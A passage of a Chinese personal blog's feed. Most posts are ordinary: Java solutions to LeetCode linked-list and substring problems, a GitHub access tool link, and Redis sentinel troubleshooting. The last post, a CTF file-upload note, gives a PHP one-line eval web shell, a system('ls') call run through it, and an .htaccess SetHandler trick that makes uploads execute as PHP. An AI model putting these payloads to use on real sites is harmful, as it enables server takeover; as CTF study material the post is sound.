title="思路"></a>思路</h5><ol><li>我们想要一个从小到大的升序链表，即每次循环都取出一个最小的节点，然后依次连接，则得到一个升序的链表。</li><li>难点在于如何在 <code>K</code> 个链表中拿到一个最小的节点。</li><li>运用优先队列-小根堆的思想，堆顶得到的永远是最小值。我们可以先遍历所有链表，把每个链表的头结点入堆，即可得到第一个最小的节点（堆顶），然后取出最小节点的下一节点入堆排序，循环取出堆顶，依次连接即可得到一条升序链表。</li></ol><p>技术栈：</p><ol><li>优先队列 <code>PriorityQueue&lt;ListNode&gt; pq = new PriorityQueue&lt;&gt;(length, (a, b) -&gt; (a.val - b.val));</code> , 小根堆就设置 <code>a.val - b.val</code></li><li>加入队列 <code>pq.add(node)</code></li><li>堆顶出列 <code>pq.poll()</code></li><li>判断堆是否为空 <code>pq.isEmpty()</code></li></ol><h5 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeKLists</span><span class="params">(ListNode[] lists)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (lists.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 虚拟头节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>), p = dummy;</span><br><span class="line">        <span class="comment">// 运用优先队列-小根堆的思想，根节点始终保持最小值</span></span><br><span class="line">        PriorityQueue&lt;ListNode&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(lists.length, (a,b) -&gt; (a.val - b.val));</span><br><span class="line">        <span class="comment">// 因为链表数组已经排序，先将链表数组内的头节点全部存入小根堆中</span></span><br><span class="line">        <span class="keyword">for</span>(ListNode head:lists) &#123;</span><br><span class="line">            <span class="comment">// 如果链表非空，则入堆</span></span><br><span class="line">            <span class="keyword">if</span>(head != <span class="literal">null</span>) pq.add(head);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 循环将链表的节点入堆，然后每次取出堆顶节点，则得到升序链表</span></span><br><span class="line">        <span class="keyword">while</span>(!pq.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// 堆顶出列</span></span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">minNode</span> <span class="operator">=</span> pq.poll();</span><br><span class="line">            p.next = minNode;</span><br><span class="line">            <span class="comment">// 如果堆顶节点还有后续节点，则入堆排序</span></span><br><span class="line">            <span class="keyword">if</span> (minNode.next != <span class="literal">null</span>) &#123;</span><br><span class="line">                pq.add(minNode.next);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// p 往下走</span></span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;困难等级。&lt;/p&gt;
&lt;p&gt;给你一个链表数组，每个链表都已经按升序排列。&lt;br&gt;请你将所有链表合并到一个升序链表中，返回合并后的链表。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="链表" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/"/>
    
    <category term="堆" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/%E5%A0%86/"/>
    
    
    <category term="二叉堆" scheme="https://blog.zhengxiangling.com/tags/%E4%BA%8C%E5%8F%89%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>No.86 分割链表</title>
    <link href="https://blog.zhengxiangling.com/2023/10/11/6-%E5%88%86%E5%89%B2%E9%93%BE%E8%A1%A8/"/>
    <id>https://blog.zhengxiangling.com/2023/10/11/6-%E5%88%86%E5%89%B2%E9%93%BE%E8%A1%A8/</id>
    <published>2023-10-11T01:45:00.000Z</published>
    <updated>2023-11-17T14:27:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>中等题目。</p><p>给你一个链表的头节点 <code>head</code> 和一个特定值 <code>x</code> ，请你对链表进行分隔，使得所有 <strong>小于</strong> <code>x</code> 的节点都出现在 <strong>大于或等于</strong> <code>x</code> 的节点之前。</p><p>你应当 <strong>保留</strong> 两个分区中每个节点的初始相对位置。</p><span id="more"></span><p> 示例 1：<br><img src="https://assets.leetcode.com/uploads/2021/01/04/partition.jpg" class="lazyload" data-srcset="https://assets.leetcode.com/uploads/2021/01/04/partition.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">输入：head = [1,4,3,2,5,2], x = 3</span><br><span class="line">输出：[1,2,2,4,3,5]</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：head = [2,1], x = 2</span><br><span class="line">输出：[1,2]</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">链表中节点的数目在范围 [0, 200] 内</span><br><span class="line">-100 &lt;= Node.val &lt;= 100</span><br><span class="line">-200 &lt;= x &lt;= 200</span><br></pre></td></tr></table></figure><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>本题为单链表，关键点为<code>虚拟头节点</code>和<code>断开原链表节点的next指针防止成环</code>。新建两条链表，把小于<code>x</code>的节点放在链表1，大于等于<code>x</code>的放在链表2，然后合并链表。</p><h5 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">partition</span><span class="params">(ListNode head, <span class="type">int</span> x)</span> &#123;</span><br><span class="line">      <span class="comment">// 虚拟头节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>), dummy2 = <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>), p1 = dummy1, p2 = dummy2;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(p != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.val &lt; x) &#123;</span><br><span class="line">                p1.next = p;</span><br><span class="line">                p1 = p1.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                p2.next = p;</span><br><span class="line">                p2 = p2.next;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 断开链</span></span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> p.next;</span><br><span class="line">            p.next = <span class="literal">null</span>;</span><br><span class="line">            p = tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p1.next = dummy2.next;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy1.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;中等题目。&lt;/p&gt;
&lt;p&gt;给你一个链表的头节点 &lt;code&gt;head&lt;/code&gt; 和一个特定值 &lt;code&gt;x&lt;/code&gt; ，请你对链表进行分隔，使得所有 &lt;strong&gt;小于&lt;/strong&gt; &lt;code&gt;x&lt;/code&gt; 的节点都出现在 &lt;strong&gt;大于或等于&lt;/strong&gt; &lt;code&gt;x&lt;/code&gt; 的节点之前。&lt;/p&gt;
&lt;p&gt;你应当 &lt;strong&gt;保留&lt;/strong&gt; 两个分区中每个节点的初始相对位置。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="链表" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/"/>
    
    
    <category term="单链表" scheme="https://blog.zhengxiangling.com/tags/%E5%8D%95%E9%93%BE%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>github稳定访问工具</title>
    <link href="https://blog.zhengxiangling.com/2023/10/11/github%E7%A8%B3%E5%AE%9A%E8%AE%BF%E9%97%AE%E5%B7%A5%E5%85%B7/"/>
    <id>https://blog.zhengxiangling.com/2023/10/11/github%E7%A8%B3%E5%AE%9A%E8%AE%BF%E9%97%AE%E5%B7%A5%E5%85%B7/</id>
    <published>2023-10-11T01:35:00.000Z</published>
    <updated>2023-11-17T14:27:30.004Z</updated>
    
    <content type="html"><![CDATA[<p>目前在用稳定工具，<a href="https://gitee.com/XingYuan55/FastGithub/releases/tag/2.1.4">FastGithub</a></p><p><a href="https://github.com/dotnetcore/FastGithub">源地址</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;目前在用稳定工具，&lt;a href=&quot;https://gitee.com/XingYuan55/FastGithub/releases/tag/2.1.4&quot;&gt;FastGithub&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/dotnetcor</summary>
      
    
    
    
    <category term="分享" scheme="https://blog.zhengxiangling.com/categories/%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>No.3 无重复字符的最长字串</title>
    <link href="https://blog.zhengxiangling.com/2023/10/10/-%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%97%E4%B8%B2/"/>
    <id>https://blog.zhengxiangling.com/2023/10/10/-%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%97%E4%B8%B2/</id>
    <published>2023-10-10T02:04:00.000Z</published>
    <updated>2023-11-17T14:27:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>中等题目</p><p>给定一个字符串 <code>s</code> ，请你找出其中不含有重复字符的 最长子串 的长度。</p><span id="more"></span><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">示例 1:</span><br><span class="line">输入: s = &quot;abcabcbb&quot;</span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span><br><span class="line"></span><br><span class="line">示例 2:</span><br><span class="line">输入: s = &quot;bbbbb&quot;</span><br><span class="line">输出: 1</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。</span><br><span class="line"></span><br><span class="line">示例 3:</span><br><span class="line">输入: s = &quot;pwwkew&quot;</span><br><span class="line">输出: 3</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。</span><br><span class="line">    请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line">0 &lt;= s.length &lt;= 5 * 10^4 </span><br><span class="line">s 由英文字母、数字、符号和空格组成</span><br></pre></td></tr></table></figure><h5 id="最开始解法"><a href="#最开始解法" class="headerlink" title="最开始解法"></a>最开始解法</h5><p>初步判断为滑动窗口，记录最长字串和最长长度，然后不断右移和缩动窗口</p><p>技术栈：<br>字符串分割 <code>String.substring(prev, last)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">subs</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.length();i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            <span class="type">int</span> <span class="variable">findIndex</span> <span class="operator">=</span> subs.indexOf(String.valueOf(c));</span><br><span class="line">            <span class="keyword">if</span> (findIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">                subs += c;</span><br><span class="line">                ans = Math.max(ans, subs.length());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ans = Math.max(ans, subs.length());</span><br><span class="line">                subs = subs.substring(findIndex + <span class="number">1</span>, subs.length()) + c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间 12ms</p><h5 id="使用滑动窗口框架解法"><a href="#使用滑动窗口框架解法" class="headerlink" title="使用滑动窗口框架解法"></a>使用滑动窗口框架解法</h5><p>使用hash记录字符出现次数，出现重复字符则滑动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        Map&lt;Character, Integer&gt; window = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (right &lt; s.length()) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(right);</span><br><span class="line">            right++;</span><br><span class="line">            window.put(c, window.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (window.get(c) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">char</span> <span class="variable">lc</span> <span class="operator">=</span> s.charAt(left); </span><br><span class="line">                left ++;</span><br><span class="line">                window.put(lc, window.get(lc) -<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ans = Math.max(ans, right - left);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间 6ms</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;中等题目&lt;/p&gt;
&lt;p&gt;给定一个字符串 &lt;code&gt;s&lt;/code&gt; ，请你找出其中不含有重复字符的 最长子串 的长度。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="滑动窗口" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
    
    
    <category term="滑动窗口" scheme="https://blog.zhengxiangling.com/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>redis哨兵模式启动和异常排查</title>
    <link href="https://blog.zhengxiangling.com/2023/02/13/redis%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F%E5%90%AF%E5%8A%A8%E5%92%8C%E5%BC%82%E5%B8%B8%E6%8E%92%E6%9F%A5/"/>
    <id>https://blog.zhengxiangling.com/2023/02/13/redis%E5%93%A8%E5%85%B5%E6%A8%A1%E5%BC%8F%E5%90%AF%E5%8A%A8%E5%92%8C%E5%BC%82%E5%B8%B8%E6%8E%92%E6%9F%A5/</id>
    <published>2023-02-13T07:34:00.000Z</published>
    <updated>2023-11-17T14:27:30.006Z</updated>
    
    <content type="html"><![CDATA[<p>当 redis 使用3台以上服务器组成一个集群时，会涉及到哨兵模式的配置，如何配置哨兵模式以及如何配置参数我们这里不做阐述，只对相关启动命令和排查哨兵模式状态是否正常做说明。</p><span id="more"></span><h2 id="常用涉及redis哨兵模式的命令"><a href="#常用涉及redis哨兵模式的命令" class="headerlink" title="常用涉及redis哨兵模式的命令"></a>常用涉及redis哨兵模式的命令</h2><h3 id="1-查看哨兵模式状态"><a href="#1-查看哨兵模式状态" class="headerlink" title="1.查看哨兵模式状态"></a>1.查看哨兵模式状态</h3><p>假设系统集群中的三台服务器为 x.x.60.11、x.x.60.12、x.x.60.13,其中60.12为集群主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 当前服务器ip地址 -p 26379 INFO</span><br></pre></td></tr></table></figure><p>查看哨兵模式状态的<code>别名</code>是否正确，状态（<code>status</code>）是否<code>ok</code>，<code>address</code>是否指向<code>x.x.60.12</code>，如果都正常则无异常。</p><h3 id="2-查看进程中-redis-的服务"><a href="#2-查看进程中-redis-的服务" class="headerlink" title="2.查看进程中 redis 的服务"></a>2.查看进程中 redis 的服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep redis</span><br></pre></td></tr></table></figure><p>正常情况下会存在两个进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UID       PID       PPID      C     STIME    TTY       TIME         CMD</span><br><span class="line">zheng     6788      0         0     00:00    pts/0      00:00:00     redis-server</span><br><span class="line">zheng     6789      0         0     00:00    pts/0      00:00:00     redis-sentinel</span><br></pre></td></tr></table></figure><h3 id="3-关闭哨兵模式服务"><a href="#3-关闭哨兵模式服务" class="headerlink" title="3.关闭哨兵模式服务"></a>3.关闭哨兵模式服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 6788 6789 <span class="comment">#上述的进程号</span></span><br></pre></td></tr></table></figure><h3 id="4-启动服务"><a href="#4-启动服务" class="headerlink" title="4.启动服务"></a>4.启动服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./redis-server redis.conf</span><br><span class="line">./redis-sentinel sentinel.conf</span><br></pre></td></tr></table></figure><h2 id="排查-redis-哨兵模式异常情况"><a href="#排查-redis-哨兵模式异常情况" class="headerlink" title="排查 redis 哨兵模式异常情况"></a>排查 redis 哨兵模式异常情况</h2><h3 id="1-检查哨兵模式状态"><a href="#1-检查哨兵模式状态" class="headerlink" title="1.检查哨兵模式状态"></a>1.检查哨兵模式状态</h3><p>ps：ip 地址分别更改为三台服务器的地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 当前服务器ip地址 -p 26379 INFO</span><br></pre></td></tr></table></figure><p>如果某台服务器<code>status</code>为<code>odown</code>，或者<code>address</code>指向不为<code>x.x.60.12</code>,则说明集群出现问题，需要重启集群。</p><h3 id="2-检查哨兵模式配置文件是否正常"><a href="#2-检查哨兵模式配置文件是否正常" class="headerlink" title="2.检查哨兵模式配置文件是否正常"></a>2.检查哨兵模式配置文件是否正常</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看每台服务器的 sentinel.conf 配置文件</span></span><br><span class="line">vi sentinel.conf</span><br></pre></td></tr></table></figure><p>查看 <code>sentinel monitor redismaster &quot;ip地址&quot; 6379 0</code>,检查 ip 地址是否为主机地址，如果不为该值则说明<code>sentinel</code> 有误，<strong>在 <code>redis</code> 的服务都暂时的情况下再修改配置文件，修改该ip地址为主机地址，然后保存</strong>。</p><h3 id="排查完如上问题，重启服务"><a href="#排查完如上问题，重启服务" class="headerlink" title="排查完如上问题，重启服务"></a>排查完如上问题，重启服务</h3><p>启动顺序，** 优先启动主机的服务 **</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先启动主机的 redis</span></span><br><span class="line">./redis-server redis.conf</span><br></pre></td></tr></table></figure><p>然后再启动从机的 <code>redis</code></p><p>然后再启动哨兵模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先启动主机的 sentinel</span></span><br><span class="line">./redis-sentinel sentinel.conf</span><br></pre></td></tr></table></figure><p>然后再启动从机的 <code>sentinel</code></p><h3 id="查询状态"><a href="#查询状态" class="headerlink" title="查询状态"></a>查询状态</h3><p>在三台服务器中输入 <code>ps -ef | grep redis</code>，如果存在两个 <code>redis</code> 进程则说明应用启动正常。<br>然后分别在三台服务器输入 <code>./redis-cli -h 当前服务器ip地址 -p 26379 INFO</code>，如果别名、状态、指向地址都正确，则说明哨兵模式正常。</p><p>然后可以通过应用验证 <code>redis</code> 是否恢复完毕。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;当 redis 使用3台以上服务器组成一个集群时，会涉及到哨兵模式的配置，如何配置哨兵模式以及如何配置参数我们这里不做阐述，只对相关启动命令和排查哨兵模式状态是否正常做说明。&lt;/p&gt;</summary>
    
    
    
    <category term="服务器" scheme="https://blog.zhengxiangling.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
    <category term="爬坑" scheme="https://blog.zhengxiangling.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/%E7%88%AC%E5%9D%91/"/>
    
    
    <category term="redis" scheme="https://blog.zhengxiangling.com/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>CTF - 文件上传</title>
    <link href="https://blog.zhengxiangling.com/2021/07/21/CTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://blog.zhengxiangling.com/2021/07/21/CTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2021-07-21T01:21:00.000Z</published>
    <updated>2023-11-17T14:27:30.001Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传分为前端验证和后端验证，前端校验即 <code>js</code> 方式的校验，可通过抓包方式绕过；后端校验是服务器端校验，需上传指定格式文件然后通过指定手段输出文件指令。</p><span id="more"></span><h2 id="黑名单-白名单"><a href="#黑名单-白名单" class="headerlink" title="黑名单 白名单"></a>黑名单 白名单</h2><ul><li>黑名单：不允许我上传什么样的文件 <code>php | html</code></li><li>白名单：仅允许我们上传什么样的文件 <code>png | jpg | gif</code></li></ul><h2 id="前端校验式文件上传"><a href="#前端校验式文件上传" class="headerlink" title="前端校验式文件上传"></a>前端校验式文件上传</h2><p>如果是前端请求被拦截，使用 <code>burpsuit</code>，直接修改文件格式为 <code>.php</code>,修改内容为一句话木马 <code>&lt;?php eval($POST[&#39;xxx&#39;];)?&gt;</code>，然后访问对应 <code>php</code> 文件，发送 <code>post</code> 请求加上参数。通过参数执行指令 <code>xxx=system(&#39;ls&#39;)</code>，执行命令找到 <code>flag</code> 然后 <code>tac</code> 输出。</p><h2 id="后端校验"><a href="#后端校验" class="headerlink" title="后端校验"></a>后端校验</h2><p>当前目录 <code>301</code> <code>302</code> 跳转，判断该目录下的文件解析类型</p><ul><li>包含ccc</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;filename&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><ul><li>文件类型 <code>. .asd .htaccess</code></li></ul><p>上传上面类型的文件，然后就可以上传对应 <code>filename</code> 后缀的文件了</p>]]></content>
    
    
